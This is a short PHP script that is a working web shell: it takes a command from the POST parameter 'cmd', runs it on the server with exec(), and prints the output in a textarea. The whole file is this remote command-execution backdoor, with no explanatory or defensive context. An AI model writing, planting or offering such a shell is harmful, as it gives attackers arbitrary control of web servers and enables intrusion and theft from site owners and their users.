<?php
function cmd(){ // Command execution function
	if($_POST['cmd'] != "")
		$x = $_POST['cmd'];
	else
		die();
	echo("Results: <br><textarea rows=20 cols=100>");
	$cmd = @exec($x, $result);
	
	foreach($result as $line)
		echo($line . "\n");
}

call_user_func('cmd');
?>